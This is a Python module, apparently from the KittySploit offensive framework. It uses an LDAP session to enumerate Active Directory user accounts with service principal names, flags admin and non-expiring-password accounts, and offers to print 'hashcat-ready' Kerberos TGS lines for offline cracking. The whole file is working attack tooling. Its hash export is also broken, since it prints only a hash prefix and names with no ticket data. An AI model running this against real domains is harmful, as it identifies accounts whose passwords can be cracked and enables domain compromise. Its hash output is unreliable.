from kittysploit import *
from lib.protocols.ldap.ldap_post_client import LdapPostClient
from lib.protocols.ldap.ad_helpers import UAC_DONT_EXPIRE_PASSWD


class Module(Post, LdapPostClient):

	__info__ = {
		"name": "LDAP Kerberoastable Users",
		"description": "Extract user accounts with servicePrincipalName values from an LDAP session",
		"author": "KittySploit Team",
		"session_type": SessionType.LDAP,
		"tags": ["ad", "ldap", "kerberos", "kerberoast", "spn"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["ldap_access"],
				"produces_capabilities": ["kerberoast_targets"],
			},
		},
	}

	include_disabled = OptBool(False, "Include disabled accounts", False)
	admin_only = OptBool(False, "Only show adminCount=1 accounts", False)
	export_hashes = OptBool(False, "Print hashcat-ready TGS lines (requires offline cracking)", False)

	def run(self):
		try:
			print_info("=" * 80)
			print_status(f"Kerberoastable users in {self.base_dn or '(domain)'}")
			filter_parts = [
				"(&(objectClass=user)",
				"(servicePrincipalName=*)",
				"(!(objectClass=computer))",
			]
			if not self.include_disabled:
				filter_parts.append("(!(userAccountControl:1.2.840.113556.1.4.803:=2))")
			filter_parts.append(")")
			rows = self.search(
				"".join(filter_parts),
				[
					"sAMAccountName",
					"servicePrincipalName",
					"userPrincipalName",
					"adminCount",
					"pwdLastSet",
					"userAccountControl",
					"distinguishedName",
				],
			)
			if self.admin_only:
				rows = [row for row in rows if self.attr_int(row, "adminCount") == 1]

			if not rows:
				print_warning("No Kerberoastable accounts found")
				return True

			for entry in rows:
				sam = self.attr_str(entry, "sAMAccountName")
				upn = self.attr_str(entry, "userPrincipalName")
				spns = self.attr_list(entry, "servicePrincipalName")
				admin = self.attr_int(entry, "adminCount") == 1
				uac = self.attr_int(entry, "userAccountControl")
				never_expire = bool(uac & UAC_DONT_EXPIRE_PASSWD)
				print_info(f"\n  {sam}")
				if upn:
					print_info(f"    UPN: {upn}")
				if admin:
					print_info("    adminCount: 1")
				if never_expire:
					print_info("    password: does not expire")
				for spn in spns:
					print_info(f"    SPN: {spn}")
					if self.export_hashes:
						target = upn or f"{sam}@{self.domain}" if self.domain else sam
						print_info(f"      hashcat: $krb5tgs$23$*{sam}${self.domain or 'DOMAIN'}${target}*")

			print_info("=" * 80)
			print_success(f"Found {len(rows)} Kerberoastable account(s)")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Kerberoastable user enumeration failed: {exc}"
			)
